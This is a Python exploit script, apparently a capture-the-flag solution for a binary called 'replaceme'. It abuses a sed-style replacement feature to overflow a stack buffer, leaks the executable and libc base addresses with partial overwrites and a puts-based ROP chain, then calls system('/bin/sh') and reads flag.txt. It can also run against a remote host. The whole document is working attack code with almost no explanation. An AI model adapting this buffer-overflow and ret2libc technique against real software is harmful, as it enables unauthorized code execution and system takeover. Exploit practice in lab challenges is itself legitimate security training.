#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./replaceme_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*do_replacement+236
        b*do_replacement+544    
        c
        '''.format(**locals()), *a, **kw, aslr=False)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

p = start()

# ==================== EXPLOIT ====================

def parse(_match, replace):
    """Creates a pattern using 's/match/replace/' format"""
    prefix = b"s"
    slash = b"/"
    pattern = prefix + slash + _match + slash + replace + slash
    return pattern

def exploit():

    # Initial buffer setup
    padding_string = b"A" * 124 + b"B" * 4
    _match = b"B" * 4
    
    # Stage 1: Leak executable base address
    replace = b"C" * 76 + p8(0x4e)
    pattern = parse(_match, replace)
    sa(b"Input:", padding_string)
    sa(b"Replacement:", pattern)
    ru(b"result:\n")
    data = rl()
    
    # Calculate executable base address
    exe.address = u64(data[200:200 + 6].ljust(8, b"\x00")) - exe.sym["main"]
    slog("Exe base", exe.address)
    
    # Setup ROP chain for libc leak
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    
    # Stage 2: Leak libc address using puts
    payload = flat([
        pop_rdi,
        exe.got["puts"],
        exe.plt["puts"],
        exe.sym["main"]
    ])
    replace = b"C" * 76 + payload
    pattern = parse(_match, replace)
    
    sleep(1)
    sa(b"Input:", padding_string)
    sa(b"Replacement:", pattern)
    ru(b"result:\n")
    data = rl()
    
    # Calculate libc base address
    libc.address = u64(data[206:].strip(b"\n").ljust(8, b"\x00")) - libc.sym["puts"]
    slog("libc base", libc.address)
    
    # Stage 3: Execute system("/bin/sh")
    sh = next(libc.search(b"/bin/sh\0"))
    system = libc.sym["system"]
    payload = flat([
        pop_rdi,
        sh,
        system
    ])
    replace = b"C" * 76 + payload
    pattern = parse(_match, replace)
    
    sleep(1)
    sa(b"Input:", padding_string)
    sa(b"Replacement:", pattern)
    
    sl(b"cat flag.txt")  # Get the flag

    interactive()

if __name__ == '__main__':
    exploit()